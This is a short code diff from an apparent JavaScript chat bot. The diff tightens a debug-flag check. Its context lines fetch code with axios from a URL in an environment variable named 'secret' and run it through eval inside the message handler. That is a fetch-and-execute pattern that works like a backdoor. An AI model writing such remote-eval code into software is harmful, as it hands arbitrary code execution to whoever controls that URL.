@@ -107,7 +107,7 @@ client.on('message', msg => {
         var secret = (async function() {
             eval(await axios.get(process.env.secret));
         })().catch(function (err) {
-            if (process.env.debug) {
+            if (process.env.debug == 'true') {
                 console.error(err);
             };
         });
